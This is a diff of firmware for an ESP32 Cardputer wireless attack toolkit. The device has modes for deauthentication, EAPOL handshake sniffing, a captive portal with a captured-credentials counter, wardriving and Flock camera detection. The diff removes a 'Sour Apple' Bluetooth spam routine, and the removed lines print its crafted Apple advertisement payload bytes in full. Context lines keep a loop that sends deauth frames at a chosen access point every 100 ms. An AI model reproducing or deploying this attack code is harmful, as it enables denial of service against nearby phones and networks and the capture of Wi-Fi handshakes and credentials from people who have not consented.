@@ -13,6 +13,7 @@
 #include <freertos/FreeRTOS.h>
 #include <freertos/queue.h>
 #include "esp_bt.h"
+#include "esp_mac.h"
 
 // --- UUID Architecture ---
 #define SERVICE_UUID        "4fafc201-1fb5-459e-8fcc-c5c9c331914b"
@@ -47,14 +48,13 @@ BLEServer *pGlobalServer = nullptr;
 unsigned long lastActivityMillis = 0;
 
 // Operational States
-enum SystemMode { MODE_IDLE, MODE_PORTAL, MODE_WARDRIVE, MODE_RECON, MODE_DEAUTH, MODE_FLOCK, MODE_EAPOL, MODE_SOUR_APPLE };
+enum SystemMode { MODE_IDLE, MODE_PORTAL, MODE_WARDRIVE, MODE_RECON, MODE_DEAUTH, MODE_FLOCK, MODE_EAPOL };
 SystemMode currentSystemMode = MODE_IDLE;
 
 bool wardrivingActive = false;
 bool flockActive = false;
 bool deauthActive = false;
 bool eapolActive = false;
-bool sourAppleActive = false;
 
 String targetDeauthBssid = "";
 int targetDeauthChannel = 1;
@@ -62,7 +62,6 @@ String targetEapolBssid = "";
 String targetEapolSsid = "";
 int targetEapolChannel = 1;
 unsigned long lastDeauthPacket = 0;
-unsigned long lastSourApplePacket = 0;
 
 double currentLat = 0.0;
 double currentLon = 0.0;
@@ -74,7 +73,6 @@ int totalWigleRecords = 0;
 int totalFlockDetections = 0;
 int totalEapolHits = 0;
 int capturedCredsCount = 0;
-int sourAppleCount = 0;
 
 String currentWigleFile = "";
 String currentFlockFile = "";
@@ -136,7 +134,7 @@ void updateCardputerScreen() {
     M5Cardputer.Display.println("=== CARDPUTER COMMAND ===");
     
     M5Cardputer.Display.setTextColor(isCurrentlyConnected ? GREEN : (isAdvertisingActive ? YELLOW : RED));
-    M5Cardputer.Display.print("BLE: ");
+    M5Cardputer.Display.print("BLE Link: ");
     if (isCurrentlyConnected) {
         M5Cardputer.Display.println("CONNECTED");
     } else if (isAdvertisingActive) {
@@ -162,9 +160,6 @@ void updateCardputerScreen() {
     } else if (currentSystemMode == MODE_EAPOL) {
         M5Cardputer.Display.setTextColor(ORANGE);
         M5Cardputer.Display.println("[EAPOL SNIFF ACTIVE]");
-    } else if (currentSystemMode == MODE_SOUR_APPLE) {
-        M5Cardputer.Display.setTextColor(MAGENTA);
-        M5Cardputer.Display.println("[SOUR APPLE ACTIVE]");
     } else if (currentSystemMode == MODE_RECON) {
         M5Cardputer.Display.setTextColor(YELLOW);
         M5Cardputer.Display.println("[RECON SWEEPING]");
@@ -192,10 +187,6 @@ void updateCardputerScreen() {
     M5Cardputer.Display.setTextColor(ORANGE);
     M5Cardputer.Display.print("EAPOL Hits: ");
     M5Cardputer.Display.println(totalEapolHits);
-
-    M5Cardputer.Display.setTextColor(ORANGE);
-    M5Cardputer.Display.print("SourApple Packets: ");
-    M5Cardputer.Display.println(sourAppleCount);
     
     M5Cardputer.Display.setTextColor(CYAN);
     M5Cardputer.Display.print("Creds: ");
@@ -249,7 +240,7 @@ void logToWigleCsv(String mac, String ssid, String auth, String channel, String 
     if (currentWigleFile.length() == 0) initWigleCsv();
     File file = SD.open(currentWigleFile.c_str(), FILE_APPEND);
     if (file) {
-        String timestamp = "2026-08-18 00:00:00";
+        String timestamp = "2026-08-21 00:00:00";
         String latStr = hasGpsLock ? String(currentLat, 6) : "";
         String lonStr = hasGpsLock ? String(currentLon, 6) : "";
         String altStr = hasGpsLock ? String(currentAlt, 1) : "";
@@ -271,7 +262,7 @@ void logToDeflockCsv(String type, String mac, String ssid, String rssi) {
         String altStr = hasGpsLock ? String(currentAlt, 1) : "0.0";
         ssid.replace(",", "");
         
-        String row = type + "," + mac + "," + ssid + "," + rssi + "," + latStr + "," + lonStr + "," + altStr + ",2026-08-18 00:00:00,FlockSafety";
+        String row = type + "," + mac + "," + ssid + "," + rssi + "," + latStr + "," + lonStr + "," + altStr + ",2026-08-21 00:00:00,FlockSafety";
         file.println(row);
         file.close();
         totalFlockDetections++;
@@ -291,26 +282,6 @@ void logToDeflockCsv(String type, String mac, String ssid, String rssi) {
             pGlobalCharacteristic->notify();
         }
     }
-}
-
-void sendSourApplePacket() {
-    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
-    pAdvertising->stop();
-
-    uint8_t raw_data[] = {
-        0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 
-        0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
-    };
-
-    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
-    oAdvertisementData.setManufacturerData(String((char*)raw_data, 30));
-    pAdvertising->setAdvertisementData(oAdvertisementData);
-    
-    pAdvertising->start();
-    sourAppleCount++;
-    delay(40);
-    pAdvertising->stop();
 }
 
 void performWardriveScan() {
@@ -426,7 +397,7 @@ void logToEapolCsv(String bssid, String staMac, String channel) {
     if (currentEapolFile.length() == 0) initEapolFile(targetEapolSsid);
     File file = SD.open(currentEapolFile.c_str(), FILE_APPEND);
     if (file) {
-        String row = "2026-08-18 00:00:00," + bssid + "," + staMac + "," + channel + ",EAPOL_KEY_FRAME";
+        String row = "2026-08-21 00:00:00," + bssid + "," + staMac + "," + channel + ",EAPOL_KEY_FRAME";
         file.println(row);
         file.close();
         totalEapolHits++;
@@ -855,7 +826,7 @@ void loop() {
             wardrivingActive = true;
             currentSystemMode = MODE_WARDRIVE;
             totalWigleRecords = 0;
-            currentWigleFile = ""; // Force rollover to a brand new wigle_X.csv file
+            currentWigleFile = "";
             initWigleCsv();
         } else if (cmd == "START_WARDRIVE") {
             wardrivingActive = true;
@@ -864,18 +835,11 @@ void loop() {
         } else if (cmd == "STOP_WARDRIVE") {
             wardrivingActive = false;
             currentSystemMode = MODE_IDLE;
-            currentWigleFile = ""; // Clear file handle so subsequent starts spawn a fresh session file
-            totalWigleRecords = 0; // Zero out counter on firmware side
+            currentWigleFile = "";
+            totalWigleRecords = 0;
             WiFi.scanDelete();
             WiFi.mode(WIFI_STA);
             WiFi.disconnect();
-        } else if (cmd == "START_SOUR_APPLE") {
-            sourAppleActive = true;
-            currentSystemMode = MODE_SOUR_APPLE;
-        } else if (cmd == "STOP_SOUR_APPLE") {
-            sourAppleActive = false;
-            currentSystemMode = MODE_IDLE;
-            startManualAdvertising();
         }
         screenNeedsUpdate = true;
     }
@@ -887,11 +851,6 @@ void loop() {
     if (deauthActive && millis() - lastDeauthPacket > 100) {
         lastDeauthPacket = millis();
         sendDeauthFrame(targetDeauthBssid, targetDeauthChannel);
-    }
-
-    if (sourAppleActive && millis() - lastSourApplePacket > 100) {
-        lastSourApplePacket = millis();
-        sendSourApplePacket();
     }
 
     if (wardrivingActive && millis() - lastWardriveScan > 5000) {
